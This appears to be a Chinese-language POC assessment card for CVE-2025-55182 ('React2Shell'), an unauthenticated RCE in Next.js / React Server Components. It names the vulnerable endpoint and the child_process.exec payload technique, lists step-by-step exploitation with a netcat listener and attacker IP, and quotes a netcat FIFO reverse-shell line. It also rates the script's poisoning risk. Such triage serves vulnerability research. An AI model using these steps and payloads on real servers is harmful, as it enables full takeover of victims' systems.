## CVE-2025-55182 - React Server Components, Next.js 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-55182

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** React Server Components, Next.js

**危害等级:** 最高危险等级 (Critical)

**CVSS评分:** 9.8

**影响版本:** Next.js 15.x 到 16.x (具体包括 15.0.0-16.0.6) 以及使用 React Server Components 的框架

**利用条件:** 未认证、网络可访问、目标应用程序使用受影响的React Server Components或Next.js版本

**POC 可用性:** 10

**POC 类型:** 完整利用 (Full Exploit)

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

### POC有效性分析
该POC代码（`CVE-2025-55182-revshell.py`）是一个高度有效且功能完整的漏洞利用脚本，旨在利用React Server Components和Next.js中的CVE-2025-55182远程代码执行漏洞。该漏洞被称为“React2Shell”，允许未认证的攻击者通过精心构造的请求在目标服务器上执行任意代码。

POC的有效性体现在以下几个方面：
1.  **目标定位准确**：脚本精确地针对受影响的`/_next/static/chunks/react-flight`端点，该端点是React Server Components (RSC) 架构中的关键组件，负责处理服务端渲染和序列化输出。漏洞的核心问题在于此组件对用户输入处理不当，导致攻击者能够注入并执行恶意代码。
2.  **利用机制清晰**：POC通过构建一个`multipart/form-data`请求，并在请求体中嵌入一个恶意JSON-like的`evil` payload。这个payload利用了RSC的序列化机制，通过`global.process.mainModule.require('child_process').exec()`来调用Node.js的`child_process`模块，从而在服务器端执行任意操作系统命令。这种方法直接利用了应用程序的服务端渲染能力，绕过了常规的安全控制。
3.  **多平台兼容性**：脚本内置了三种不同的反向shell payload：Bash反向shell、Netcat反向shell和PowerShell反向shell。这种设计显著增强了POC的适用性，使其能够针对不同操作系统（Linux和Windows）的目标服务器成功获取反向shell，从而提高了漏洞利用的成功率。
4.  **自动化程度高**：脚本设计为“一键式”操作，只需提供目标URL和攻击者的监听器地址（LHOST:LPORT），即可自动发送所有payload并尝试建立反向shell连接。它甚至在开始攻击前提示用户启动Netcat监听器，体现了良好的用户体验和即时反馈。
5.  **请求构造专业**：POC正确设置了HTTP头部（`Content-Type: multipart/form-data`），并使用了动态生成的`boundary`，确保了恶意请求的合法性和可解析性。它还包含了用户代理信息`User-Agent: Mozilla/5.0 (CVE-2025-55182)`，方便识别。
6.  **错误处理**：虽然简单，但POC包含了对请求失败的捕获，并在所有payload尝试完毕后提供反馈，指导用户检查监听器或考虑目标已被打补丁/WAF阻挡的情况。

综合来看，该POC是一个经过精心设计、高度可靠且易于使用的利用工具，充分验证了CVE-2025-55182漏洞的严重性和可利用性，完全符合其“Instant Reverse Shell”的描述。

### 利用步骤
1.  **准备环境**：攻击者需要一台可访问目标网络的攻击机，并在该机器上安装Python3和`requests`库（`pip install requests`）。
2.  **启动监听器**：在攻击机上，攻击者需要启动一个Netcat监听器，用于接收来自目标服务器的反向shell连接。例如，如果监听端口为4444，则执行命令：`nc -lvnp 4444`。
3.  **获取目标URL**：识别一个运行受影响版本React Server Components或Next.js的应用程序的URL，例如`https://vuln.example.com`。
4.  **执行POC脚本**：攻击者在命令行中执行POC脚本，提供目标URL和监听器的IP地址及端口。例如：`python3 CVE-2025-55182-revshell.py https://vuln.example.com 10.10.14.66:4444`（其中`10.10.14.66`是攻击机的IP地址，`4444`是监听端口）。
5.  **POC发送请求**：POC脚本将向目标URL的`/_next/static/chunks/react-flight`路径发送一个构造好的HTTP POST请求。该请求包含multipart/form-data格式的恶意payload，其中嵌入了利用`child_process.exec()`执行反向shell命令的代码。
6.  **获取反向Shell**：如果目标服务器存在漏洞且未打补丁，它将在处理恶意请求时执行POC提供的反向shell命令。成功执行后，目标服务器将主动连接到攻击机上的Netcat监听器，攻击者即可在监听器会话中获得一个交互式的shell，从而完全控制目标系统。

### 投毒风险分析
该POC代码（`CVE-2025-55182-revshell.py`）的投毒风险评估为**低**，具体为10%。

1.  **代码透明度与可读性**：该Python脚本的代码清晰、结构化良好，注释充分，并且没有使用任何代码混淆技术。所有功能（如参数解析、HTTP请求构造、payload生成）都直观地体现在代码中，使得安全研究人员可以轻松审计其完整行为，确保没有隐藏的恶意功能。

2.  **依赖项管理**：脚本仅依赖Python标准库（`sys`, `time`）和一个广泛使用的第三方HTTP客户端库`requests`。`requests`库是一个经过充分审查且高度信任的开源项目，本身不携带恶意功能。代码没有引入任何未知或可疑的外部依赖，也没有动态下载或执行外部脚本的行为。

3.  **核心功能聚焦**：脚本的核心目标是利用CVE-2025-55182漏洞来获取目标系统的反向shell。它提供的Bash、Netcat和PowerShell反向shell命令是标准且公开可用的漏洞利用技术，用于建立与攻击者控制的监听器之间的连接。这些命令本身是实现漏洞利用的载荷，而不是POC脚本自身的投毒行为。POC的目的是验证漏洞的存在性和可利用性，并提供一个攻击者获得目标系统控制权的示例。

4.  **网络行为分析**：POC在执行过程中会向用户指定的目标URL发送HTTP POST请求，并在成功利用后，使目标服务器尝试连接回攻击者预设的监听IP和端口。除了这些预期的漏洞利用相关网络通信外，脚本没有表现出任何异常的网络行为，例如：连接到未声明的第三方服务器、C2（命令与控制）服务器、下载额外恶意载荷、或对外发送敏感信息。其所有网络流量都指向明确的用户定义目标或攻击者自身的监听器。

5.  **文件系统操作**：脚本中的Netcat反向shell payload包含创建和删除`/tmp/f`文件的命令（`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f`）。这是Linux系统上常用的Netcat反向shell技巧，通过命名管道（FIFO）实现输入输出重定向，属于漏洞利用载荷的一部分，而非POC脚本自身在本地环境执行的恶意文件操作。POC本身没有在本地运行环境中执行任何未经授权的文件读写或系统配置修改。

6.  **持久化机制**：POC代码不包含任何旨在在运行其的攻击机上建立持久化机制（如添加启动项、计划任务或修改系统文件）的逻辑。它是一个一次性执行的利用工具，不会对攻击机的安全状态造成长期影响。

综上所述，该POC代码是典型的、专注于漏洞验证和利用的工具，设计意图明确，代码行为透明。其“投毒”风险极低，因为它不包含任何隐藏的恶意功能、不进行未经授权的本地系统修改，也不与不明第三方进行通信。其危险性在于成功利用漏洞后对目标系统的危害，而非POC代码本身对运行环境的危害。

**项目地址:** https://github.com/Ashwesker/Blackash-CVE-2025-55182

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-55182
